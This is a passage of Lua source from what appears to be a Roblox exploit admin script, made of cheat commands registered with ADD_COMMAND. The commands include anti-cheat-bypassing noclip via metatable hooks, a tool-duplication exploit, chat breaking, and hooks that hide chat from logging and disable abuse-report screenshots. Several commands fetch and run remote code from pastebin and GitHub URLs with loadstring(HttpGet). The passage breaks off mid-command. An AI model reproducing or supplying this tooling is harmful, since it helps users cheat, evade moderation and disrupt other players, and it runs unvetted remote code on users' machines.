		ADD_COMMAND('controlnpcs','controlnpcs',{},
		function()
			--- made by joshclark756#7155
			-- Variables
			local mouse = game.Players.LocalPlayer:GetMouse()
			local uis = game:GetService("UserInputService")

			-- Connect
			mouse.Button1Down:Connect(function()
				-- Check for Target & Left Shift
				if mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl) then
					local npc = mouse.target.Parent
					local npcRootPart = npc.HumanoidRootPart
					local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
					local PlayerRootPart = PlayerCharacter.HumanoidRootPart
					local A0 = Instance.new("Attachment")
					local AP = Instance.new("AlignPosition")
					local AO = Instance.new("AlignOrientation")
					local A1 = Instance.new("Attachment")
					for _, v in pairs(npc:GetDescendants()) do
						if v:IsA("BasePart") then
							game:GetService("RunService").Stepped:Connect(function()
								v.CanCollide = false
							end)
						end
					end
					PlayerRootPart:BreakJoints()
					for _, v in pairs(PlayerCharacter:GetDescendants()) do
						if v:IsA("BasePart") then
							if v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "Head" then
							else
								v:Destroy()
							end
						end
					end
					PlayerRootPart.Position = PlayerRootPart.Position+Vector3.new(5, 0, 0)
					PlayerCharacter.Head.Anchored = true
					PlayerCharacter.UpperTorso.Anchored = true
					A0.Parent = npcRootPart
					AP.Parent = npcRootPart
					AO.Parent = npcRootPart
					AP.Responsiveness = 200
					AP.MaxForce = math.huge
					AO.MaxTorque = math.huge
					AO.Responsiveness = 200
					AP.Attachment0 = A0
					AP.Attachment1 = A1
					AO.Attachment1 = A1
					AO.Attachment0 = A0
					A1.Parent = PlayerRootPart
				end
			end)
		end)

		ADD_COMMAND('attachpart','attachpart',{},
		function()
			-- made by joshclark756#7155
			-- Variables
			local mouse = game.Players.LocalPlayer:GetMouse()
			local uis = game:GetService("UserInputService")

			-- Connect
			mouse.Button1Down:Connect(function()
				-- Check for Target & Left Shift
				if mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl) then
					local npc = mouse.target
					local npcparts = mouse.target.Parent
					local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
					local PlayerRootPart = PlayerCharacter.HumanoidRootPart
					local A0 = Instance.new("Attachment")
					local AP = Instance.new("AlignPosition")
					local AO = Instance.new("AlignOrientation")
					local A1 = Instance.new("Attachment")
					for _, v in pairs(npcparts:GetDescendants()) do
						if v:IsA("BasePart") or v:IsA("Part") and v.Name ~= "HumanoidRootPart" then
							do
								v.CanCollide = false

							end
						end
					end
					-- Variables
					local mouse = game.Players.LocalPlayer:GetMouse()
					local uis = game:GetService("UserInputService")

					-- Connect
					mouse.Button1Down:Connect(function()
						if mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl) then
							local npc = mouse.target
							local npcparts = mouse.target.Parent
							local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
							local PlayerRootPart = PlayerCharacter.HumanoidRootPart
							local A0 = Instance.new("Attachment")
							local AP = Instance.new("AlignPosition")
							local AO = Instance.new("AlignOrientation")
							local A1 = Instance.new("Attachment")
							for _, v in pairs(npcparts:GetDescendants()) do
								if v:IsA("BasePart") or v:IsA("Part") and v.Name ~= "HumanoidRootPart" then
									do
										v.CanCollide = false

										wait(0)
										local player = game.Players.LocalPlayer
										local mouse = player:GetMouse()
										bind = "e" -- has to be lowercase
										mouse.KeyDown:connect(function(key)
											if key == bind then do
													v.CanCollide = true
												end
											end
										end)
									end
								end
							end
							for _, v in pairs(PlayerCharacter:GetDescendants()) do
								if v:IsA("BasePart") then
									if v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "Head" then

									end
								end
							end
							PlayerRootPart.Position = PlayerRootPart.Position+Vector3.new(0, 0, 0)
							PlayerCharacter.Head.Anchored = false
							PlayerCharacter.Torso.Anchored = false
							A0.Parent = npc
							AP.Parent = npc
							AO.Parent = npc
							AP.Responsiveness = 200
							AP.MaxForce = math.huge
							AO.MaxTorque = math.huge
							AO.Responsiveness = 200
							AP.Attachment0 = A0
							AP.Attachment1 = A1
							AO.Attachment1 = A1
							AO.Attachment0 = A0
							A1.Parent = PlayerRootPart
						end
					end)
					for _, v in pairs(PlayerCharacter:GetDescendants()) do
						if v:IsA("BasePart") then
							if v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "Head" then

							end
						end
					end
					PlayerRootPart.Position = PlayerRootPart.Position+Vector3.new(0, 0, 0)
					PlayerCharacter.Head.Anchored = false
					PlayerCharacter.Torso.Anchored = false
					A0.Parent = npc
					AP.Parent = npc
					AO.Parent = npc
					AP.Responsiveness = 200
					AP.MaxForce = math.huge
					AO.MaxTorque = math.huge
					AO.Responsiveness = 200
					AP.Attachment0 = A0
					AP.Attachment1 = A1
					AO.Attachment1 = A1
					AO.Attachment0 = A0
					A1.Parent = PlayerRootPart
				end
			end)
		end)

		ADD_COMMAND('netless','netless',{},
		function()
			for i,v in next, game:GetService("Players").LocalPlayer.Character:GetDescendants() do
				if v:IsA("BasePart") and v.Name ~="HumanoidRootPart" then 
					game:GetService("RunService").Heartbeat:connect(function()
						v.Velocity = Vector3.new(-30,0,0)
					end)
				end
			end

			game:GetService("StarterGui"):SetCore("SendNotification", { 
				Title = "Notification";
				Text = "Ligma Netless Ran";
				Icon = "rbxthumb://type=Asset&id=5107182114&w=150&h=150"})
			Duration = 16;
		end)

		ADD_COMMAND('kidnap','kidnap',{},
		function()
			game.Players.LocalPlayer:GetMouse().KeyDown:connect(function(key)
				if key == 'z' then
					local h = game.Players.LocalPlayer.Character.Humanoid:Clone()
					local plr = game.Players.LocalPlayer.Character
					local CF = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
					local lp = game.Players.LocalPlayer

					h.Parent = game.Players.LocalPlayer.Character
					h.Name = "Hum"

					game.Players.LocalPlayer.Character.Humanoid:Destroy()

					for _,v in pairs(game.Players.LocalPlayer:GetDescendants()) do
						if v.ClassName == "Tool" then
							v.Parent = plr
						end
					end
					wait(.5)
					tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(150, Enum.EasingStyle.Linear)

					tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(0, -1000, 0)})
					tween:Play()
				end
			end)
		end)

		ADD_COMMAND('dupetools','dupetools',{},
		function(ARGS)
			local AmountToDupe = tonumber(ARGS[1])

			local plr = game.Players.LocalPlayer
			local char = plr.Character
			local pos = char.HumanoidRootPart.Position
			local http = game:GetService("HttpService")

			local file = 'rejoindupe.json'
			writefile(file,http:JSONEncode({
				['AmountToDupe'] = AmountToDupe,
				['CurrentAmount'] = 0
			}))
			char.HumanoidRootPart.CFrame = CFrame.new(0,999999,0)
			for i,v in pairs(plr.Backpack:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = char
				end
			end
			wait(.3)
			for i,v in pairs(char:GetChildren()) do
				if v:IsA("Tool") then
					v.Parent = workspace
				end
			end

			local dupescript = [[
      game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen()
      repeat wait() until game.Players.LocalPlayer
      repeat wait() until game.Players.LocalPlayer.Character
      repeat wait() until game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
      game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(%s)
      local plr = game.Players.LocalPlayer
      local char = plr.Character
      local file = "%s"
      local a = readfile(file)
      local data = game:GetService("HttpService"):JSONDecode(a)
      if data['CurrentAmount'] >= data['AmountToDupe'] then
          wait(0.5)
          for i,v in pairs(workspace:GetChildren()) do
              if v:IsA("Tool") then
                  char.Humanoid:EquipTool(v)
              end
          end
          return
      else
          wait()
          char.HumanoidRootPart.CFrame = CFrame.new(0,999999,0)
          for i,v in pairs(plr.Backpack:GetChildren()) do
              if v:IsA("Tool") then
                  v.Parent = char
              end
          end
          wait(.3)
          for i,v in pairs(char:GetChildren()) do
              if v:IsA("Tool") then
                  v.Parent = workspace
              end
          end
          wait(.1)
          data['CurrentAmount'] = data['CurrentAmount'] + 1
          writefile(file,game:GetService("HttpService"):JSONEncode(data))
      end
      syn.queue_on_teleport(readfile("%s"))
      repeat
      game:GetService("TeleportService"):Teleport(game.PlaceId)    
      wait(0.5)
      until nil
   ]]
			dupescript = string.format(dupescript,tostring(pos),file,"dupescript.lua")

			writefile('dupescript.lua',dupescript)
			syn.queue_on_teleport(dupescript)
			game:GetService("TeleportService"):Teleport(game.PlaceId)
		end)

		ADD_COMMAND('replicationui','replicationui',{},
		function()
			loadstring(game:HttpGet("https://pastebin.com/raw/vr2YVyF6"))();
		end)

		ADD_COMMAND('gravitygun','gravitygun',{},
		function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/qipurblx/Script/main/Gravity%20Gun"))()
		end)

		ADD_COMMAND('respawn','respawn',{},
		function()
			game.Players.LocalPlayer.Character.Humanoid.Name = 1
			local l = game.Players.LocalPlayer.Character["1"]:Clone()
			l.Parent = game.Players.LocalPlayer.Character
			l.Name = "Humanoid"
			wait()
			game.Players.LocalPlayer.Character["1"]:Destroy()
			game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character
			game.Players.LocalPlayer.Character.Animate.Disabled = true
			wait()
			game.Players.LocalPlayer.Character.Animate.Disabled = false
			game.Players.LocalPlayer.Character.Humanoid.DisplayDistanceType = "None"
			wait()
			local prt = Instance.new("Model", workspace);
			Instance.new("Part", prt).Name="Torso";
			Instance.new("Part", prt).Name="Head";
			Instance.new("Humanoid", prt).Name="Humanoid";
			game.Players.LocalPlayer.Character=prt
		end)

		ADD_COMMAND('grabtools','grabtools',{},
		function()
			local p = game:GetService("Players").LocalPlayer
			local c = p.Character
			if c and c:FindFirstChild("Humanoid") then
				for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
					if v:IsA("Tool") then
						c:FindFirstChild("Humanoid"):EquipTool(v)
					end
				end
			end
		end)



		ADD_COMMAND('r6','r6',{},
		function()
			local Global = (getgenv and getgenv()) or shared
			Global.GelatekReanimateConfig = {
				-- [[ Rig Settings ]] --
				["R15ToR6"] = true,
			}

			loadstring(game:HttpGet("https://raw.githubusercontent.com/Gelatekussy/GelatekReanimate/main/Main.lua"))()
		end)

		ADD_COMMAND('invisible','invisible',{},
		function()
			loadstring(game:HttpGetAsync("https://pastebin.com/raw/0wE8rKJ1"))()
		end)

		ADD_COMMAND('holdpartr15','holdpartr15',{},
		function()
			-- made by joshclark756#7155
			local mouse = game.Players.LocalPlayer:GetMouse()
			local uis = game:GetService("UserInputService")

			-- Connect
			mouse.Button1Down:Connect(function()
				-- Check for Target & Left Shift
				if mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl) then
					local npc = mouse.target
					local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
					local PlayerRootPart = PlayerCharacter.HumanoidRootPart
					local A0 = Instance.new("Attachment")
					local AP = Instance.new("AlignPosition")
					local AO = Instance.new("AlignOrientation")
					local A1 = Instance.new("Attachment")
					for _, v in pairs(npc:GetDescendants()) do
						if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
							game:GetService("RunService").Stepped:Connect(function()
								v.CanCollide = false
							end)
						end
					end

					for _, v in pairs(PlayerCharacter:GetDescendants()) do
						if v:IsA("BasePart") then
							if v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "Head" then
							end
						end
					end
					PlayerRootPart.Position = PlayerRootPart.Position+Vector3.new(0, 0, 0)
					A0.Parent = npc
					AP.Parent = npc
					AO.Parent = npc
					AP.Responsiveness = 200
					AP.MaxForce = math.huge
					AO.MaxTorque = math.huge
					AO.Responsiveness = 200
					AP.Attachment0 = A0
					AP.Attachment1 = A1
					AO.Attachment1 =  A1
					AO.Attachment0 = A0
					A1.Parent = PlayerCharacter.RightHand
				end
			end)
		end)

		ADD_COMMAND('holdpartr6','holdpartr6',{},
		function()
			-- made by joshclark756#7155
			local mouse = game.Players.LocalPlayer:GetMouse()
			local uis = game:GetService("UserInputService")

			-- Connect
			mouse.Button1Down:Connect(function()
				-- Check for Target & Left Shift
				if mouse.Target and uis:IsKeyDown(Enum.KeyCode.LeftControl) then
					local npc = mouse.target
					local PlayerCharacter = game:GetService("Players").LocalPlayer.Character
					local PlayerRootPart = PlayerCharacter.HumanoidRootPart
					local A0 = Instance.new("Attachment")
					local AP = Instance.new("AlignPosition")
					local AO = Instance.new("AlignOrientation")
					local A1 = Instance.new("Attachment")
					for _, v in pairs(npc:GetDescendants()) do
						if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
							game:GetService("RunService").Stepped:Connect(function()
								v.CanCollide = false
							end)
						end
					end

					for _, v in pairs(PlayerCharacter:GetDescendants()) do
						if v:IsA("BasePart") then
							if v.Name == "HumanoidRootPart" or v.Name == "UpperTorso" or v.Name == "Head" then
							end
						end
					end
					PlayerRootPart.Position = PlayerRootPart.Position+Vector3.new(0, 0, 0)
					A0.Parent = npc
					AP.Parent = npc
					AO.Parent = npc
					AP.Responsiveness = 200
					AP.MaxForce = math.huge
					AO.MaxTorque = math.huge
					AO.Responsiveness = 200
					AP.Attachment0 = A0
					AP.Attachment1 = A1
					AO.Attachment1 =  A1
					AO.Attachment0 = A0
					A1.Parent = PlayerCharacter:FindFirstChild("Right Arm")
				end
			end)
		end)

		ADD_COMMAND('creatorid','creatorid',{},
		function()
			if game.CreatorType == Enum.CreatorType.User then
				game.Players.LocalPlayer.UserId = game.CreatorId
			end
			if game.CreatorType == Enum.CreatorType.Group then
				game.Players.LocalPlayer.UserId = game:GetService("GroupService"):GetGroupInfoAsync(game.CreatorId).Owner.Id
			end 
		end)

		ADD_COMMAND('fcd','fcd / fireclickdetectors',{},
		function()
			NOTIFY('Fired all click detectors!', 0, 255, 0)
			wait()
			for i,v in pairs(game:GetDescendants()) do
				if v:IsA("ClickDetector") then
					fireclickdetector(v)
				end
			end 
		end)

		ADD_COMMAND('fti','fti / firetouchinerests',{},
		function()
			NOTIFY('Fired all touch interests!', 0, 255, 0)
			wait()
			for _,v in pairs(workspace:GetDescendants()) do
				if v:IsA("TouchTransmitter") then
					firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 0) --0 is touch
					wait()
					firetouchinterest(game.Players.LocalPlayer.Character.HumanoidRootPart, v.Parent, 1) -- 1 is untouch
				end
			end
		end)

		ADD_COMMAND('dex','dex',{},
		function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
		end)

		ADD_COMMAND('breakchat','breakchat',{},
		function()
			for i=1,3 do 
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\0", "All")
			end
		end)

		ADD_COMMAND('noclip','noclip (keybind x)',{},
		function()
			local nckey = "x";
			local nclip = false;
			local lp = game.Players.LocalPlayer
			local ms = lp:GetMouse()
			local rm = getrawmetatable(game)
			local index = rm.__index
			local bv = Instance.new("BoolValue");
			bv.Value = false;
			setreadonly(rm,false)

			rm.__index = function(self,j)
				if tostring(self) == "Part" and tostring(j) == "Anchored" then
					return index(bv,"Value")
				end
				return index(self,j)
			end


			game:GetService("RunService").Stepped:Connect(function()
				if nclip == true then
					lp.Character.Head.CanCollide = false
					lp.Character.Torso.CanCollide = false
				end
			end);

			ms.KeyDown:Connect(function(k)
				if k == nckey then
					nclip = not nclip
					if nclip == true then
						print("Noclip is on.")
					else
						print("Noclip if off.")
					end
				end
			end)

			print("Noclip key is X");
			print("Press X to turn noclip on and off");
			print("This noclip should bypass most anti-cheats");
		end)

		ADD_COMMAND('antichatlog','antichatlog',{},
		function()
			-- no skid :)
			if not game:IsLoaded() then
				game.Loaded:wait()
			end

			local ACL_LoadTime = tick()

			local CoreGui = game:GetService("CoreGui")
			local StarterGui = game:GetService("StarterGui")
			local TweenService = game:GetService("TweenService")
			local Players = game:GetService("Players")

			local Player = Players.LocalPlayer

			local PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui") do
				if not PlayerGui then
					repeat task.wait() until Player:FindFirstChildWhichIsA("PlayerGui")
					PlayerGui = Player:FindFirstChildWhichIsA("PlayerGui")
				end
			end

			local Notify = function(_Title, _Text , Time)
				StarterGui:SetCore("SendNotification", {Title = _Title, Text = _Text, Icon = "rbxassetid://2541869220", Duration = Time})
			end

			local Tween = function(Object, Time, Style, Direction, Property)
				return TweenService:Create(Object, TweenInfo.new(Time, Enum.EasingStyle[Style], Enum.EasingDirection[Direction]), Property)
			end

			local Insert = function(Tbl, ...)
				for _, x in next, {...} do
					table.insert(Tbl, x) 
				end
			end

			local ChatFixToggle = true
			local CoreGuiSettings = {}
			local ChatFix

			ChatFix = hookmetamethod(StarterGui, "__namecall", function(self, ...)
				local Method = getnamecallmethod()
				local Arguments = {...}

				if not checkcaller() and ChatFixToggle and Method == "SetCoreGuiEnabled" then
					local CoreGuiType = Arguments[1]
					local SettingValue = Arguments[2]

					if CoreGuiType == ("All" or "Chat") then
						Insert(CoreGuiSettings, CoreGuiType, SettingValue)
						return
					end
				end

				return ChatFix(self, ...)
			end)

			local ACLWarning = Instance.new("ScreenGui")
			local Background = Instance.new("Frame")
			local Top = Instance.new("Frame")
			local Exit = Instance.new("TextButton")
			local UICorner = Instance.new("UICorner")
			local WarningLbl = Instance.new("TextLabel")
			local Loading = Instance.new("Frame")
			local Bar = Instance.new("Frame")
			local WarningBackground = Instance.new("Frame")
			local WarningFrame = Instance.new("Frame")
			local Despair = Instance.new("TextLabel")
			local UIListLayout = Instance.new("UIListLayout")
			local Reason_1 = Instance.new("TextLabel")
			local Reason_2 = Instance.new("TextLabel")
			local Trollge = Instance.new("ImageLabel")
			local UIPadding = Instance.new("UIPadding")

			local MakeGuiThread = coroutine.wrap(function()    
				syn.protect_gui(ACLWarning)

				ACLWarning.Name = "ACL Warning"
				ACLWarning.Parent = CoreGui
				ACLWarning.Enabled = false
				ACLWarning.DisplayOrder = -2147483648

				Background.Name = "Background"
				Background.Parent = ACLWarning
				Background.AnchorPoint = Vector2.new(0.5, 0.5)
				Background.BackgroundColor3 = Color3.fromRGB(21, 0, 0)
				Background.BorderSizePixel = 0
				Background.Position = UDim2.new(0.5, 0, 0.5, 0)
				Background.Size = UDim2.new(0.300000012, 0, 0.5, 0)

				Top.Name = "Top"
				Top.Parent = Background
				Top.AnchorPoint = Vector2.new(0.5, 0.5)
				Top.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
				Top.BorderSizePixel = 0
				Top.Position = UDim2.new(0.5, 0, 0.100000001, 0)
				Top.Size = UDim2.new(0.899999976, 0, 0.100000001, 0)

				Exit.Name = "Exit"
				Exit.Parent = Top
				Exit.AnchorPoint = Vector2.new(0.5, 0.5)
				Exit.BackgroundColor3 = Color3.fromRGB(38, 0, 0)
				Exit.Position = UDim2.new(0.949999988, 0, 0.5, 0)
				Exit.Size = UDim2.new(0.100000001, -6, 1, -9)
				Exit.Visible = false
				Exit.Font = Enum.Font.Arcade
				Exit.Text = "X"
				Exit.TextColor3 = Color3.fromRGB(255, 255, 255)
				Exit.TextScaled = true
				Exit.TextSize = 14.000
				Exit.TextWrapped = true

				UICorner.CornerRadius = UDim.new(0.200000003, 0)
				UICorner.Parent = Exit

				WarningLbl.Name = "WarningLbl"
				WarningLbl.Parent = Top
				WarningLbl.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				WarningLbl.BackgroundTransparency = 1.000
				WarningLbl.Position = UDim2.new(0, 17, 0, 0)
				WarningLbl.Size = UDim2.new(0.5, 0, 1, 0)
				WarningLbl.Font = Enum.Font.Arcade
				WarningLbl.Text = "Warning!"
				WarningLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
				WarningLbl.TextScaled = true
				WarningLbl.TextSize = 14.000
				WarningLbl.TextWrapped = true
				WarningLbl.TextXAlignment = Enum.TextXAlignment.Left

				Loading.Name = "Loading"
				Loading.Parent = Top
				Loading.AnchorPoint = Vector2.new(0.5, 0.5)
				Loading.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
				Loading.BorderSizePixel = 0
				Loading.Position = UDim2.new(0.699999988, 0, 0.5, 0)
				Loading.Size = UDim2.new(0.349999994, 0, 0.0199999996, 0)

				Bar.Name = "Bar"
				Bar.Parent = Loading
				Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Bar.BorderSizePixel = 0
				Bar.Size = UDim2.new(0, 0, 1, 0)

				WarningBackground.Name = "WarningBackground"
				WarningBackground.Parent = Background
				WarningBackground.AnchorPoint = Vector2.new(0.5, 0.5)
				WarningBackground.BackgroundColor3 = Color3.fromRGB(9, 9, 9)
				WarningBackground.BorderSizePixel = 0
				WarningBackground.Position = UDim2.new(0.5, 0, 0.550000012, 0)
				WarningBackground.Size = UDim2.new(0.899999976, 0, 0.800000012, 0)

				WarningFrame.Name = "WarningFrame"
				WarningFrame.Parent = WarningBackground
				WarningFrame.AnchorPoint = Vector2.new(0.5, 0.5)
				WarningFrame.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
				WarningFrame.BorderSizePixel = 0
				WarningFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
				WarningFrame.Size = UDim2.new(0.899999976, 0, 0.899999976, 0)

				Despair.Name = "Despair"
				Despair.Parent = WarningFrame
				Despair.AnchorPoint = Vector2.new(0.5, 0.5)
				Despair.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
				Despair.BackgroundTransparency = 1.000
				Despair.BorderColor3 = Color3.fromRGB(27, 42, 53)
				Despair.BorderSizePixel = 0
				Despair.Position = UDim2.new(0.5, 0, 0.100000001, 0)
				Despair.Size = UDim2.new(0.949999988, 0, 0.119999997, 0)
				Despair.Font = Enum.Font.Oswald
				Despair.Text = "Anti Chat Logger will not work here!"
				Despair.TextColor3 = Color3.fromRGB(255, 255, 255)
				Despair.TextScaled = true
				Despair.TextSize = 50.000
				Despair.TextWrapped = true
				Despair.TextYAlignment = Enum.TextYAlignment.Top

				UIListLayout.Parent = WarningFrame
				UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				UIListLayout.Padding = UDim.new(0, 15)

				Reason_1.Name = "Reason_1"
				Reason_1.Parent = WarningFrame
				Reason_1.AnchorPoint = Vector2.new(0.5, 0.5)
				Reason_1.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
				Reason_1.BackgroundTransparency = 1.000
				Reason_1.BorderColor3 = Color3.fromRGB(27, 42, 53)
				Reason_1.BorderSizePixel = 0
				Reason_1.Position = UDim2.new(0.5, 0, 0.100000001, 0)
				Reason_1.Size = UDim2.new(0.949999988, 0, 0.100000001, 0)
				Reason_1.Visible = false
				Reason_1.Font = Enum.Font.Oswald
				Reason_1.Text = "-Chat Module was not found."
				Reason_1.TextColor3 = Color3.fromRGB(255, 0, 0)
				Reason_1.TextScaled = true
				Reason_1.TextSize = 50.000
				Reason_1.TextWrapped = true
				Reason_1.TextYAlignment = Enum.TextYAlignment.Top

				Reason_2.Name = "Reason_2"
				Reason_2.Parent = WarningFrame
				Reason_2.AnchorPoint = Vector2.new(0.5, 0.5)
				Reason_2.BackgroundColor3 = Color3.fromRGB(17, 17, 17)
				Reason_2.BackgroundTransparency = 1.000
				Reason_2.BorderColor3 = Color3.fromRGB(27, 42, 53)
				Reason_2.BorderSizePixel = 0
				Reason_2.Position = UDim2.new(0.5, 0, 0.100000001, 0)
				Reason_2.Size = UDim2.new(0.949999988, 0, 0.100000001, 0)
				Reason_2.Visible = false
				Reason_2.Font = Enum.Font.Oswald
				Reason_2.Text = "-MessagePosted function is invalid."
				Reason_2.TextColor3 = Color3.fromRGB(255, 0, 0)
				Reason_2.TextScaled = true
				Reason_2.TextSize = 50.000
				Reason_2.TextWrapped = true
				Reason_2.TextYAlignment = Enum.TextYAlignment.Top

				Trollge.Name = "Trollge"
				Trollge.Parent = WarningFrame
				Trollge.AnchorPoint = Vector2.new(0.5, 0.5)
				Trollge.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				Trollge.BackgroundTransparency = 1.000
				Trollge.Position = UDim2.new(0.5, 0, 0.670000017, 0)
				Trollge.Size = UDim2.new(0.449999988, 0, 0.5, 0)
				Trollge.Image = "rbxassetid://10104834800"

				UIPadding.Parent = WarningFrame
				UIPadding.PaddingTop = UDim.new(0, 10)

				Exit.MouseButton1Click:Connect(function()
					local UpTween = Tween(Background, .2, "Quint", "Out", {Position = UDim2.new(0.5, 0, 0.45, 0)})
					local DownTween = Tween(Background, 1, "Quad", "Out", {Position = UDim2.new(0.5, 0, 2, 0)})
					UpTween:Play()
					UpTween.Completed:wait()
					DownTween:Play()
					DownTween.Completed:wait()
					ACLWarning:Destroy()
				end)
			end)()

			local ExitCooldown = function()
				wait(3)
				local Tween = Tween(Bar, 5, "Quad", "InOut", {Size = UDim2.new(1, 0, 1, 0)})
				Tween:Play()
				Tween.Completed:wait()
				Loading:Destroy()
				Exit.Visible = true
			end

			local PlayerScripts = Player:WaitForChild("PlayerScripts")
			local ChatMain = PlayerScripts:FindFirstChild("ChatMain", true) or false

			if not ChatMain then
				local Timer = tick()
				repeat
					task.wait()
				until PlayerScripts:FindFirstChild("ChatMain", true) or tick() > (Timer + 3)
				ChatMain = PlayerScripts:FindFirstChild("ChatMain", true)
				if not ChatMain then
					ACLWarning.Enabled = true
					Reason_1.Visible = true
					ExitCooldown()
					return
				end
			end

			local PostMessage = require(ChatMain).MessagePosted

			if not PostMessage then
				ACLWarning.Enabled = true
				Reason_2.Visible = true
				ExitCooldown()
				return
			end

			local MessageEvent = Instance.new("BindableEvent")
			local OldFunctionHook
			OldFunctionHook = hookfunction(PostMessage.fire, function(self, Message)
				if not checkcaller() and self == PostMessage then
					MessageEvent:Fire(Message)
					return
				end
				return OldFunctionHook(self, Message)
			end)

			if setfflag then
				setfflag("AbuseReportScreenshot", "False")
				setfflag("AbuseReportScreenshotPercentage", 0)
			end

			ChatFixToggle = false
			ACLWarning:Destroy()
			if OldSetting then
				StarterGui:SetCoreGuiEnabled(CoreGuiSettings[1], CoreGuiSettings[2])
			end
			Notify("Loaded Successfully", "Anti Chat and Screenshot Logger Loaded!", 15)
			print(string.format("Anti Chat-Logger has loaded in %s seconds.", tostring(tick() - ACL_LoadTime):sub(1, 4)))
		end)

		ADD_COMMAND('soundglitcher','soundglitcher',{},
		function()
			local duration = 999999 -- integer only, no decimals
			if game:GetService("SoundService").RespectFilteringEnabled then return end

			local sounds = {}

			for i,v in pairs(Game:GetDescendants()) do
				if v:IsA("Sound")  then
					table.insert(sounds,v)
				end
			end


			local con = Game.DescendantAdded:Connect(function(v)
				if v:IsA("Sound") then
					table.insert(sounds,v)
				end
			end)
			wait(.1)
			local start = math.floor(tick())
			repeat
				for i,v in pairs(sounds) do
					v:Play()
					v.TimePosition = math.random(0,v.TimeLength * 1000)/1000
					task.wait()
				end
			until math.floor(tick()) == start + duration
			con:Disconnect()

			for i,v in pairs(sounds) do
				v:Stop()
			end
		end)

		ADD_COMMAND('fpp','fpp / fireproximityprompts',{},
		function()
			fireproximityprompt(workspace.Instance.ProximityPrompt, 1, true)
		end)

		ADD_COMMAND('removedn','removedn / removedisplaynames',{},
		function()
			local Players = game:FindService("Players")

			require(game:GetService("Chat"):WaitForChild("ClientChatModules").ChatSettings).PlayerDisplayNamesEnabled = false

			local function rename(character,name)
				repeat task.wait() until character:FindFirstChildWhichIsA("Humanoid")
				character:FindFirstChildWhichIsA("Humanoid").DisplayName = name
			end

			for i,v in next, Players:GetPlayers() do
				if v.Character then
					v.DisplayName = v.Name
					rename(v.Character,v.Name)
				end
				v.CharacterAdded:Connect(function(char)
					rename(char,v.Name)
				end)
			end

			Players.PlayerAdded:Connect(function(plr)
				plr.DisplayName = plr.Name
				plr.CharacterAdded:Connect(function(char)
					rename(char,plr.Name)
				end)
			end)
		end)

		ADD_COMMAND('rejoin','rejoin',{},
		function()
			local ts = game:GetService("TeleportService")
			local p = game:GetService("Players").LocalPlayer
			ts:TeleportToPlaceInstance(game.PlaceId, game.JobId, p)
		end)

		ADD_COMMAND('sit','sit',{},
		function()
			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = true
		end)

		ADD_COMMAND('lowgraphics','lowgraphics',{},
		function()
			local Terrain = workspace:FindFirstChildOfClass('Terrain')
			Terrain.WaterWaveSize = 0
			Terrain.WaterWaveSpeed = 0
			Terrain.WaterReflectance = 0
			Terrain.WaterTransparency = 0
			settings().Rendering.QualityLevel = 1
			for i,v in pairs(game:GetDescendants()) do
				if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
					v.Material = "Plastic"
					v.Reflectance = 0
				elseif v:IsA("Decal") then
					v.Transparency = 1
				elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
					v.Lifetime = NumberRange.new(0)
				elseif v:IsA("Explosion") then
					v.BlastPressure = 1
					v.BlastRadius = 1
				end
			end
			for i,v in pairs(Lighting:GetDescendants()) do
				if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
					v.Enabled = false
				end
			end
			workspace.DescendantAdded:Connect(function(child)
				coroutine.wrap(function()
					if child:IsA('ForceField') then
						RunService.Heartbeat:Wait()
						child:Destroy()
					elseif child:IsA('Sparkles') then
						RunService.Heartbeat:Wait()
						child:Destroy()
					elseif child:IsA('Smoke') or child:IsA('Fire') then
						RunService.Heartbeat:Wait()
						child:Destroy()
					end
				end)()
			end)
		end)

		ADD_COMMAND('fatesadmin','fatesadmin',{},
		function()
